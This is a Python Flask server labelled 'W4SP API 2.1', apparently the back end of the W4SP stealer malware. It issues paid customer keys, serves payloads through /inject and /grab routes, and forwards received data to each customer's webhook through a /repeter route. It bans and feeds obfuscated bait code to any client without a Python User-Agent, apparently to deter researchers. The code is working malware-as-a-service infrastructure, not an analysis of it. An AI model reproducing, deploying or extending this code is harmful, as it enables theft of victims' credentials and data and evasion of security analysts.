from flask import Flask, request, Response
from datetime import datetime
from random import choice
import json
from etc.keys import Response1, Gen, Remove, Edit, Script, Inject, Grab, Webhook, bait, Response2, Keys
from etc.hype import Obfuscate
from requests import post

app = Flask(__name__)

with open('config.json', 'r') as f:
    config = json.load(f)

admin_key = config['GENERAL']['adminkey']
host = config['GENERAL']['localhost']
port = config['GENERAL']['port']


dev_ip_whitelist = ["127.0.0.1", "192.168.2.1"]

# W4SP API 2.1
# by billythegoat356 (1.3)
# upgraded by uuid and lotus

# <-- api security -->
# wrong adminkey = ip_ban
# no Python useragent = ip_ban
# index request = ip_ban

# also save ip in ram to prevent opening blacklist files to much times
global Lblacklisted_ips
Lblacklisted_ips = "1.2.3.4"


blacklisted_ips = ""

def log(ip, why):
    if ip in dev_ip_whitelist: return
    with open('logs.txt', 'a+') as logfile:
        now = datetime.now()
        logfile.write(f"[{now}] ~ {ip} | {why}\n")
        print(f"[{now}] ~ {ip} | {why}")
    logfile.close()


def load_blacklisted_ips(blacklisted_ips):
    with open('blacklistedip.txt', 'r') as file:
        for line in file:
            blacklisted_ips += line
    file.close()
    return blacklisted_ips

def blacklist_ip(ip, x):
    global Lblacklisted_ips
    if ip not in Lblacklisted_ips and dev_ip_whitelist:
        Lblacklisted_ips += f"~{ip}~"
        with open('blacklistedip.txt', 'a+') as file:
            file.write(f"{ip}\n")

def is_user_blacklisted(ip, Lblacklisted_ips):
    return True if ip in Lblacklisted_ips else False

@app.before_request
def check_blacklisted_ips():
    global Lblacklisted_ips
    client_ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)
    if not client_ip in dev_ip_whitelist:
        if client_ip in Lblacklisted_ips:
            return Response(Response2, 200)

@app.route('/')
def main_route():
    client_ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)
    blacklist_ip(client_ip, Lblacklisted_ips)
    log(client_ip, "BANNED, BROWSED /")
    return Response1

@app.errorhandler(404)
def not_found(error):
    client_ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)
    blacklist_ip(client_ip, Lblacklisted_ips)
    log(client_ip, "BANNED, WEIRD REQUEST END POINT")
    return Response1, 401

@app.route('/gen', methods=['POST'])
def gen_route():
    client_ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)
    headers = request.headers
    if headers.get('key') != admin_key:
        blacklist_ip(client_ip, Lblacklisted_ips)
        log(client_ip, "BANNED, BAD ADMIN_KEY, /GEN")
        return Response1, 401
    return ('', Gen(headers.get('id'), headers.get('username'), headers.get('payment')))

@app.route('/keys', methods=['POST'])
def keys_route():
    client_ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)
    headers = request.headers
    if headers.get('key') != admin_key:
        blacklist_ip(client_ip, Lblacklisted_ips)
        log(client_ip, "BANNED, BAD ADMIN_KEY, /KEYS")
        return Response1, 401
    with open('keys.json', mode='r', encoding='utf-8') as f:
        return f.read(), 200

@app.route('/rm', methods=['POST'])
def remove_route():
    client_ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)
    headers = request.headers
    if headers.get('key') != admin_key:
        blacklist_ip(client_ip, Lblacklisted_ips)
        log(client_ip, "BANNED, BAD ADMIN_KEY, /RM")
        return Response1, 401
    return ('', Remove(headers.get('user_key')))

@app.route('/edit', methods=['POST'])
def edit_route():
    client_ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)
    headers = request.headers
    log(client_ip, "USED /EDIT")
    return Edit(key=headers.get('key'), webhook=headers.get('webhook'))

@app.route('/script/<public_key>')
def script_route(public_key):
    client_ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)
    headers = request.headers
    log(client_ip, f"USED /SCRIPT")
    return Script(public_key, headers['User-Agent'])

@app.route('/inject/<public_key>')
def inject_route(public_key):
    client_ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)
    headers = request.headers
    if "User-Agent" not in headers or "Python" not in headers['User-Agent']:
        blacklist_ip(client_ip, Lblacklisted_ips)
        log(client_ip, "BANNED, BAD UA, BAIT")
        return Obfuscate(bait)
    else:
        log(client_ip, "USED INJECT")
        return Inject(public_key=public_key, headers=headers)

@app.route('/grab/<public_key>')
def grab_route(public_key):
    client_ip = request.environ.get('HTTP_X_REAL_IP', request.remote_addr)
    headers = request.headers
    if "User-Agent" not in headers or "Python" not in headers['User-Agent']:
        blacklist_ip(client_ip, Lblacklisted_ips)
        log(client_ip, "BANNED, BAD UA, BAIT")
        return Obfuscate(bait)
    else:
        log(client_ip, "USED GRAB")
        return Grab(public_key=public_key, headers=headers)

@app.route('/repeter/<public_key>', methods=['POST'])
def repeter(public_key):
    webhook = Keys._get_webhook_by_pkey(public_key)
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    response = post(webhook, headers=headers, json=request.get_json())
    return Response(Response1, 200)


if __name__ == '__main__':
    Lblacklisted_ips = load_blacklisted_ips(Lblacklisted_ips)

app.run(host, port)
